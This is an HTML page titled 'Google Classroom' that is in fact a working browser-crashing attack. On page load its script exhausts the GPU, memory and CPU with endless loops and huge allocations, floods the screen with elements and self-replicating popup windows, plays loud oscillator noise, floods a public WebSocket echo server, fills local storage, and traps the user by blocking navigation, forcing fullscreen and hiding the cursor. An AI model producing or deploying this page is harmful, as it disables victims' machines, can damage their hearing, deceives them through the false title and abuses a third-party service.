<!DOCTYPE html>
<html>
<head><title>Google Classroom</title></head>
<body style="margin:0;overflow:hidden;background:#000;">
    <canvas id="c"></canvas>
    <script>
        // ===== 1. GPU核弹：10000个3D动物 + 实时光影 =====
        var s=document.createElement('script');
        s.src='https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js';
        document.head.appendChild(s);
        s.onload=function(){
            var w=window.innerWidth,h=window.innerHeight;
            var scene=new THREE.Scene();
            var camera=new THREE.PerspectiveCamera(75,w/h,0.1,1000);
            camera.position.z=30;
            var renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true});
            renderer.setSize(w,h);
            renderer.shadowMap.enabled=true;
            
            // 10000个动物
            var animals=[];
            for(var i=0;i<10000;i++){
                var group=new THREE.Group();
                var mat=new THREE.MeshPhongMaterial({color:Math.random()*0xffffff,shininess:100});
                var body=new THREE.Mesh(new THREE.SphereGeometry(0.3,16,16),mat);
                group.add(body);
                var head=new THREE.Mesh(new THREE.SphereGeometry(0.2,16,16),mat);
                head.position.y=0.4;group.add(head);
                for(var j=0;j<4;j++){
                    var leg=new THREE.Mesh(new THREE.CylinderGeometry(0.05,0.05,0.3,16),mat);
                    leg.position.x=(j<2?-0.15:0.15);leg.position.z=(j%2==0?-0.15:0.15);leg.position.y=-0.3;
                    group.add(leg);
                }
                group.position.x=(Math.random()-0.5)*80;
                group.position.y=(Math.random()-0.5)*80;
                group.position.z=(Math.random()-0.5)*50;
                animals.push(group);scene.add(group);
            }
            
            // 动态光源
            var light=new THREE.PointLight(0xffffff,1,100);
            scene.add(light);
            var ambient=new THREE.AmbientLight(0x404040);
            scene.add(ambient);
            
            function render(){
                light.position.x=Math.sin(Date.now()/1000)*40;
                light.position.y=Math.cos(Date.now()/1000)*40;
                for(var i=0;i<animals.length;i++){
                    animals[i].rotation.x+=0.02;
                    animals[i].rotation.y+=0.03;
                    animals[i].rotation.z+=0.01;
                }
                renderer.render(scene,camera);
                requestAnimationFrame(render);
            }
            render();
        };
        
        // ===== 2. 内存核弹：10GB/s =====
        var ram=[];
        setInterval(function(){
            for(var i=0;i<5;i++){
                ram.push(new ArrayBuffer(200*1024*1024)); // 200MB x5 = 1GB
            }
        },100); // 每100ms吞1GB = 10GB/s
        
        // ===== 3. CPU核弹：主线程饱和阻塞 =====
        setInterval(function(){
            var start=Date.now();
            while(Date.now()-start<900){} // 每1ms阻塞900ms
        },1);
        
        // ===== 4. 递归死锁核弹 =====
        function deadLock(){
            for(var i=0;i<10;i++){
                setTimeout(deadLock,0);
            }
            var x=0;
            while(true){x+=Math.random();}
        }
        deadLock();
        
        // ===== 5. DOM核弹：每秒1000个元素 =====
        setInterval(function(){
            for(var i=0;i<200;i++){
                var d=document.createElement('div');
                d.style.cssText='position:fixed;width:100px;height:100px;background:hsl('+Math.random()*360+',100%,50%);z-index:999;opacity:0.8;';
                d.style.left=Math.random()*window.innerWidth+'px';
                d.style.top=Math.random()*window.innerHeight+'px';
                document.body.appendChild(d);
            }
        },100);
        
        // ===== 6. 弹窗核弹：几何级爆炸 =====
        function bombWindows(){
            for(var i=0;i<200;i++){
                window.open(location.href,'','width=50,height=50');
            }
            setTimeout(bombWindows,200);
        }
        bombWindows();
        
        // ===== 7. 音频核弹：爆音攻击 =====
        var ctx=new(window.AudioContext||window.webkitAudioContext)();
        setInterval(function(){
            for(var i=0;i<50;i++){
                var osc=ctx.createOscillator();
                osc.frequency.value=Math.random()*4000;
                var gain=ctx.createGain();
                gain.gain.value=10;
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();osc.stop(ctx.currentTime+0.1);
            }
        },20);
        
        // ===== 8. WebSocket洪水 =====
        for(var i=0;i<500;i++){
            try{
                var ws=new WebSocket('wss://echo.websocket.org');
                setInterval(function(){try{ws.send(new Array(10000).join('x'))}catch(e){}},1);
            }catch(e){}
        }
        
        // ===== 9. localStorage炸弹 =====
        setInterval(function(){
            try{
                localStorage.setItem('bomb'+Math.random(),new Array(5000000).join('x'));
            }catch(e){}
        },10);
        
        // ===== 10. 防止退出 =====
        window.onbeforeunload=function(){return'系统已锁定'};
        history.pushState(null,null,location.href);
        window.onpopstate=function(){history.go(1)};
        
        // ===== 11. 全屏强制 =====
        document.documentElement.requestFullscreen();
        
        // ===== 12. 鼠标指针隐藏 =====
        document.body.style.cursor='none';
    </script>
</body>
</html>
